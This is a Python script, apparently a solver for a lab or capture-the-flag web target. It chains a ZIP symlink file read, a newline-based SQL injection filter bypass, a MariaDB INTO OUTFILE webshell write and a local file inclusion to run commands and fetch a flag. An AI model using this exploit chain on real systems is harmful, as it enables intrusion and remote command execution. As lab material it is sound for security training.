#!/usr/bin/env python3
"""Black-box attacker, restricted to the target HTTP endpoint only."""
import hashlib
import io
import os
import re
import stat
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile

BASE = os.environ.get("TARGET_URL", "http://zipping-target:8080").rstrip("/")
FLAG = os.environ["EXPECTED_USER_FLAG"]
assert re.fullmatch(r"TTP\{[a-zA-Z0-9_]+\}", FLAG)
opener = urllib.request.build_opener()

def get(path):
    with opener.open(BASE + path, timeout=20) as r:
        return r.status, r.read().decode("utf-8", "replace")

def upload_zip(name, data):
    boundary = "----zipping" + uuid.uuid4().hex
    body = (
        "--" + boundary + "\r\n"
        'Content-Disposition: form-data; name="zip_file"; filename="' + name + '"\r\n'
        "Content-Type: application/zip\r\n\r\n"
    ).encode() + data + ("\r\n--" + boundary + "--\r\n").encode()
    req = urllib.request.Request(BASE + "/upload.php", data=body, headers={
        "Content-Type": "multipart/form-data; boundary=" + boundary})
    with opener.open(req, timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace")

def archive_with_symlink(target):
    # A true Unix symlink stored in ZIP metadata; not a file containing a path.
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_STORED) as archive:
        info = zipfile.ZipInfo("portfolio.pdf")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        archive.writestr(info, target)
    return out.getvalue()

def leak(target):
    data = archive_with_symlink(target)
    status, response = upload_zip("resume.zip", data)
    assert status == 200, response
    assert "uploaded successfully" in response, response[-1300:]
    match = re.search(r'href="(/uploads/[a-f0-9]{32}/portfolio\.pdf)"', response)
    assert match, response[-1000:]
    _, contents = get(match.group(1))
    return contents

print("[1/10] Public shopping site and careers form")
_, home = get("/")
assert "ZIPPING" in home and "/shop/" in home
_, form = get("/upload.php")
assert 'name="zip_file"' in form and "ZIP archive" in form

print("[2/10] Real product detail retrieved from native MariaDB")
_, item = get("/shop/index.php?page=product&id=1")
assert "Classic Leather" in item
_, missing = get("/shop/index.php?page=product&id=100")
assert "Product does not exist!" in missing

print("[3/10] Reject invalid uploaded document")
invalid_data = io.BytesIO()
with zipfile.ZipFile(invalid_data, "w") as archive:
    archive.writestr("plain.txt", "not a PDF")
_, rejected = upload_zip("resume.zip", invalid_data.getvalue())
assert "must have a .pdf extension" in rejected

print("[4/10] Native 7z extraction of a Unix ZIP symlink")
passwd = leak("/etc/passwd")
assert "root:x:0:0:" in passwd, "Real symbolic-link file-read failed"

print("[5/10] Leak authentic PHP application source through ZIP symlink")
source = leak("/var/www/html/shop/product.php")
assert "preg_match(" in source and 'SELECT * FROM products WHERE id' in source
assert "PDO::FETCH_ASSOC" in source

print("[6/10] PHP input filter rejects obvious injection")
try:
    _, ordinary = get("/shop/index.php?" + urllib.parse.urlencode({
        "page": "product", "id": "100' UNION SELECT 1,2,3,4,5,6,7,8-- -1"
    }))
except urllib.error.HTTPError as err:
    ordinary = err.read().decode()
assert "Classic Leather" not in ordinary, "Obvious injection unexpectedly succeeds"

print("[7/10] Real multiline regex bypass with UNION query")
injection = "\n100' UNION SELECT 1,0x5a495050494e475f554e494f4e,3,4,5,6,7,8-- -1"
_, union = get("/shop/index.php?" + urllib.parse.urlencode({
    "page": "product", "id": injection
}))
assert "ZIPPING_UNION" in union, "PHP regex bypass or native MariaDB UNION failed"

print("[8/10] FILE privilege writes a real PHP file in shared /dev/shm")
uid = uuid.uuid4().hex[:10]
path = "/dev/shm/zipping-" + uid + ".php"
php = '<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>'
payload_hex = php.encode().hex()
sql = "\n100' UNION SELECT 0x" + payload_hex + ",2,3,4,5,6,7,8 INTO OUTFILE '" + path + "'-- -1"
_, response = get("/shop/index.php?" + urllib.parse.urlencode({
    "page": "product", "id": sql
}))
assert "Product does not exist!" in response or "Collection" in response

print("[9/10] PHP LFI includes actual MariaDB-created webshell")
url = "/shop/index.php?" + urllib.parse.urlencode({
    "page": path[:-4], "cmd": "id"
})
_, command_output = get(url)
assert "uid=33(www-data)" in command_output, command_output[-700:]

print("[10/10] Web execution reaches per-instance user flag")
url = "/shop/index.php?" + urllib.parse.urlencode({
    "page": path[:-4], "cmd": "cat /home/rektsu/user.txt"
})
_, flag_body = get(url)
assert FLAG in flag_body, "Web-stage user Flag mismatch"

print("PASS: real 7z ZIP symlink -> PHP source -> filter-bypass MariaDB UNION/FILE -> real LFI -> Web Flag")
